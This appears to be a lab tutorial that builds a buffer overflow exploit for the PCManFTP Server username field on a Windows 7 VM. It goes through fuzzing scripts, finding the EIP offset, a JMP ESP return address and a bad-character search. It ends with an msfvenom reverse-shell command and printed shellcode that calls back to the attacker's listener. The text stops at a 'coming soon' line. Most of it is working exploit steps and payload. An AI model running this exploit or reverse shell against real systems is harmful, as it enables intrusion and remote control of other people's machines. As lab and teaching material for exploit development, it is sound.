# BUFFER OVERFLOW PCManFTP Server

### Setup
  - Follow along video: https://www.youtube.com/watch?v=nwJxWfmhb8s
  - Vulnerable App: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
  - Attacker VM: Kali Linux 2020
  - Victim VM: Windows 7 SP1 32 Bit
    - Firewalls Off
    - UAC Off
    - Immunity Debugger Installed ( https://www.immunityinc.com/products/debugger/ )
    - PCManftp extracted to C:\PCMan
  - Using VirtualBox and a NAT Network

### Getting Started
Make sure you have you VMs installed, the NAT Network enabled so the machines can talk to each other, and the Immunity Debugger and PCManFTP software installed. When you are ready, start up your Kali machine and the Windows 7 box. 

When Windows is ready, start the PCManFTP program, we don't need Immunity yet, so leave that closed.

### Fuzzing the App
I'm fairly certain we can overload the username field and crash the program, so we are going to use a python script to do so. In the file *fuzzer1.py* we will use a socket connection to send the username as an increasingly large number of "A's" until we crash the program. Each time the process runs it send the username as a string of A's and then the word pass for the password before disconnecting and telling us hw many characters it sent. Eventually the program will crash and we'll have a good idea of how many characters to send to cause the crash. We run the program by entering `python fuzzer1.py`.

### After the Crash: Finding the Offset
From our results of running *fuzzer1.py* we know that the crash happens between 2000 and 2100 characters, so now we need to narrow that down. To do so we will copy fuzzer1.py into a new file called fuzzer2.py and add in a long, unique string to help find the correct offset. To do so, we'll run a simple command in our Kali VM:

` /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100 `

This will genrate a long string 2100 characters long. We'll send that string as our username so we can find the offset. Take a look at *fuzzer2.py* to see how we add this. Before run fuzer2.py, we need to restart the PCManFTP program on our Win & VM, and also start up Immunity Debugger.

Once we have both programs running, go into Immunity Debugger and click File > Attach and choose the PCManFTP program from the list and click "Attach." Next, click the Play arrow in the upper left - make sure the lower left corner says "Running". Now we ca switch back to our Kali VM and run fuzzer2: `python fuzzer2.py`.

The program will crash quickly, but our python script will be hung, just hit ctrl + c to kill it, then switch to our Win 7 VM. In the Immunity Debugger, look at the upper right quadrant and write down the address listed in the EIP section - this is a piece of the random string we sent and will tell us the offset. After you get it written down, switch back to the Kali VM. Now we run another command and tell it the address we wrote down:

` /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 396F4338`

In a couple seconds the program will return the offset, in my test this was 2006 characters. Now we copy fuzzer2.py to make fuzzer3.py:
`cp fuzzer2.py fuzzer3.py`.

So now in fuzzer3 we change up what we are sending:
`client.send("user " + "A" * 2006 + "B" * 4 + "C" * 300)`

This will send 2006 A's, followed by 4 B's and 300 C's. What we hope to see is the EIP changed to 42424242 - which would be the 4 B's that follow our offset of 2006 A's. Once our script is ready, we need to switch to the Win 7 VM and restart PCManFTP and Immunity Debugger, and then attach and run as we did before.

Once we are set, we can run fuzzer3: `python fuzzer3.py`  and we should crash the program again. Switch back to the WIN 7 VM and confirm that the EIP is 42424242, if it's not, then we need to figure out why. If it reads 42424241 we have 1 too many A's, 42424141 is 2 too many, etc. If it's all 43's then we don't have enough A's.

### We have all 42's...
OK, so we have the correct offset, don't close Immunity yet! In the menu bar located in the upper left, click on the button labeled "e" to show the running processes. We need to find and double-click on the line containing "SHELL32.DLL". Now we need to right-click in the upper left quadrant and choose Search For... > Command and enter in JMP ESP to search for our return address. We need to write down that address to use in the rest of our scripts.

Now let's copy our fuzzer3.py script into fuzzer4.py:  `cp fuzzer3.py fuzzer4.py`

Now, before we start making changes we need to jump back into the WIN 7 VM and set things back up for another run. This time, before we hit the run button, we need to right-click in the upper left quadrant and select "Go To" > "Expression" and then paste in our return address. After we hit OK we need to hit the F2 key to set a breakpoint, then we can click run and return to our script writing.

In our fuzzer4.py script, we are going to replace the `+ "B" * 4 ` part of our script with `+ ret `. Then at the top we need to add:

`ret = "\x28\x6c\x9A\x76"`

This is our return address **769A6C28** written in little endian format. This is the 4 pairs written in reverse order with a preceding \x between each two character set.

Once this is set, we can run our program and see if the PCManFTP program is in a paused state in Immunity Debugger and stopped at the address we placed the breakpoint. If it is, we are good to go, if not we'll need to review our steps up to now and find our mistake.

##Bad Characters
Now we need to reset everything on the Win 7 box, without the breakpoint this time, and make a copy of our fuzzer4 script as fuzzer5.py:

`cp fuzzer4.py fuzzer5.py`

In the new script we need to replace the `+ "C" * 300 ` part of our script with `+ badchar `

And in the upper part of the script we need to add:

`badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
`
Now when we run the script we'll need to take a hard look at the bottom right quadrant of Immunity Debugger. We will be looking for bad characters that might make our exploit crash, \x00 is always a bad character, so we don't have that in our list - but we need to remember it for later. 

Now we run the fuzzer5 script and then switch back to the WIN 7 VM. In Immunity Debugger, we need to scroll in the lower right pane until we reach the end of the A's we sent, and then past the return address we set. What we will see is something *like* this:

`
0012F564 04030201 xxxx
0012F565 08000605 xxxx
0012F566 12111009 xxxx
...
`

What we need to look for is any missing number - in the example above the number 07 was replaced with 00 - that's a bad character and we need to make a note of it, and remove it from the badchar list in our script. We need to repeat this process until we don't have any more bad characters. In my example, I ran this 3 times and ended up with these bad characters: \x00\x0a\x0d,

Once we know the bad characters, we can close Immunity Debugger and re-run the PCManFTP program by itself. Then we need to jump back to Kali and copy our fuzzer5 script to exploit.py:

`cp fuzzer5.py exploit.py`

We can delete all the badchar stuff now and then add some new variables to our script:

`nop = "\x90" * 20
buf = b""`

In this case *nop* means no operation, we add 20 of these so the code has a buffer between our return address and the exploit code. The *buf* here is creating our exploit code - we will complete this after we create the code using MSVenom. The b"" means we are adding bytecode. For the rest of the exploit we will start each line with buff += b

So let's create our exploit code, we do this by running:

`msvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x0a\xod"`

So let's break this down:

  *msvenom* Starts the msvenom program
  
  *-p* Sets the path to the exploit we want
  
  *windows/shell_reverse_tcp* Tells the program we want a reverse shell for Windows
  
  *LHOST=10.0.2.15* This is our local machine's IP address
  
  *LPORT=4444* Sets the port we will be listening on for the reverse shell
  
  *EXITFUNC=thread* Set the exit function to THREAD so we can interact with the reverse shell
  
  *-f* Specify the file type
  
  *c* Write the shellcode as a C program
  
  *-a* Set the architecture of the victim machine
  
  *x86* Set this as a 32-bit machine for the code
  
  *-b* Specify bad characters to avoid
  
  *"\x00\x0a\xod"* These were the bad characters we found.
  
The program will spit out our shellcode for us, we just need to add it to the script and edit the lines so it looks similar to this:

`
buf = b""
buf += b"\xba\xd8\xbe\xcc\x48\xdb\xd0\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
buf += b"\x52\x83\xc5\x04\x31\x55\x0e\x03\x8d\xb0\x2e\xbd\xd1\x25\x2c"
buf += b"\x3e\x29\xb6\x51\xb6\xcc\x87\x51\xac\x85\xb8\x61\xa6\xcb\x34"
buf += b"\x09\xea\xff\xcf\x7f\x23\xf0\x78\x35\x15\x3f\x78\x66\x65\x5e"
buf += b"\xfa\x75\xba\x80\xc3\xb5\xcf\xc1\x04\xab\x22\x93\xdd\xa7\x91"
buf += b"\x03\x69\xfd\x29\xa8\x21\x13\x2a\x4d\xf1\x12\x1b\xc0\x89\x4c"
buf += b"\xbb\xe3\x5e\xe5\xf2\xfb\x83\xc0\x4d\x70\x77\xbe\x4f\x50\x49"
buf += b"\x3f\xe3\x9d\x65\xb2\xfd\xda\x42\x2d\x88\x12\xb1\xd0\x8b\xe1"
buf += b"\xcb\x0e\x19\xf1\x6c\xc4\xb9\xdd\x8d\x09\x5f\x96\x82\xe6\x2b"
buf += b"\xf0\x86\xf9\xf8\x8b\xb3\x72\xff\x5b\x32\xc0\x24\x7f\x1e\x92"
buf += b"\x45\x26\xfa\x75\x79\x38\xa5\x2a\xdf\x33\x48\x3e\x52\x1e\x05"
buf += b"\xf3\x5f\xa0\xd5\x9b\xe8\xd3\xe7\x04\x43\x7b\x44\xcc\x4d\x7c"
buf += b"\xab\xe7\x2a\x12\x52\x08\x4b\x3b\x91\x5c\x1b\x53\x30\xdd\xf0"
buf += b"\xa3\xbd\x08\x56\xf3\x11\xe3\x17\xa3\xd1\x53\xf0\xa9\xdd\x8c"
buf += b"\xe0\xd2\x37\xa5\x8b\x29\xd0\xc0\x4b\x33\x2f\xbd\x49\x33\x3e"
buf += b"\x61\xc7\xd5\x2a\x89\x81\x4e\xc3\x30\x88\x04\x72\xbc\x06\x61"
buf += b"\xb4\x36\xa5\x96\x7b\xbf\xc0\x84\xec\x4f\x9f\xf6\xbb\x50\x35"
buf += b"\x9e\x20\xc2\xd2\x5e\x2e\xff\x4c\x09\x67\x31\x85\xdf\x95\x68"
buf += b"\x3f\xfd\x67\xec\x78\x45\xbc\xcd\x87\x44\x31\x69\xac\x56\x8f"
buf += b"\x72\xe8\x02\x5f\x25\xa6\xfc\x19\x9f\x08\x56\xf0\x4c\xc3\x3e"
buf += b"\x85\xbe\xd4\x38\x8a\xea\xa2\xa4\x3b\x43\xf3\xdb\xf4\x03\xf3"
buf += b"\xa4\xe8\xb3\xfc\x7f\xa9\xc4\xb6\xdd\x98\x4c\x1f\xb4\x98\x10"
buf += b"\xa0\x63\xde\x2c\x23\x81\x9f\xca\x3b\xe0\x9a\x97\xfb\x19\xd7"
buf += b"\x88\x69\x1d\x44\xa8\xbb"
`



*rest of article coming soon*




